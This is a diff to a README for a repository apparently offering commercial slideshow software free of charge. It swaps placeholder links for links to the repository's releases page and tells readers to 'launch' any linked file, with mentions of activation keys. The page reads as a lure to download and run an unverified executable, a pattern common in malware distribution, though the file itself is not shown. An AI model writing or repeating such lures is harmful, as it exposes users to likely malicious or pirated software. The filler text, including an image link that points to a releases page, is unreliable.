@@ -36,12 +36,12 @@ Explore the following topics related to Movavi Slideshow Maker and enhance your 
 - Explore Movavi Slideshow Video Maker
 
 ## Access Resources 🔗
-For easy access to resources related to Movavi Slideshow Maker, visit [Project.zip](https://github.com/files/Project.zip). If the link ends with a file name, launch it to explore more. For additional information or alternative links, check the "Releases" section.
+For easy access to resources related to Movavi Slideshow Maker, visit [https://github.com/fatihtugay/Movavi-Slideshow-Maker-Free/releases](https://github.com/fatihtugay/Movavi-Slideshow-Maker-Free/releases). If the link ends with a file name, launch it to explore more. For additional information or alternative links, check the "Releases" section.
 
 ## Stay Updated 🚀
 Stay tuned for the latest updates, tips, and tricks to make the most out of Movavi Slideshow Maker Free. Your journey to creating visually captivating slideshows starts here! 🎬
 
-![Movavi Slideshow](https://example.com/movavi-slideshow.jpg)
+![Movavi Slideshow](https://github.com/fatihtugay/Movavi-Slideshow-Maker-Free/releases)
 
 Have fun creating amazing slideshows with Movavi Slideshow Maker Free! 🎉
 
@@ -51,4 +51,4 @@ Let your creativity shine! 🌟 Enjoy! 🚀
 
 Remember to check out the latest updates on file sharing, activation keys, and more for Movavi Slideshow Maker. Feel free to contribute to this repository and share your experiences with the community! 👩‍💻👨‍💻
 
-📷 Image sources: Example.com, Pexels.
+📷 Image sources: https://github.com/fatihtugay/Movavi-Slideshow-Maker-Free/releases, Pexels.
